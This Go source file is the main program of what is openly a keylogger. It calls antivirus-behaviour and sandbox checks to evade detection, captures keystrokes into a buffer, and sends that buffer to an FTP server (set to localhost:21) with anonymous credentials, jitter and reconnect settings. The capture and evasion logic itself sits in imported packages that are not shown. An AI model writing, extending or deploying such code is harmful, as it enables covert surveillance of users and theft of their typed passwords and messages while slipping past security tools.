package main

import (
	"bytes"
	"time"

	"github.com/adelapazborrero/logger/connector"
	"github.com/adelapazborrero/logger/keys"
	"github.com/adelapazborrero/logger/utils"
)

const (
	FTP_HOST        = "localhost:21"
	DEFAULT_TIMEOUT = 5 * time.Second
	RECONNECT_DELAY = 5 * time.Second
	MAX_JITTER      = 5
	USERNAME        = "anonymous"
	PASSWORD        = ""
	LOG_BUFFER_SIZE = 1024
)

var logBuffer *bytes.Buffer
var keyLogger *keys.KeyLoggerService

func main() {
	utils.AVBehaviourCheck()
	utils.SandboxCheck()

	keyLogger.CaptureKeys(logBuffer)

	ftp := connector.NewFTP(
		FTP_HOST,
		USERNAME,
		PASSWORD,
		DEFAULT_TIMEOUT,
		MAX_JITTER,
		RECONNECT_DELAY,
	)

	ftp.SendData(logBuffer)
}
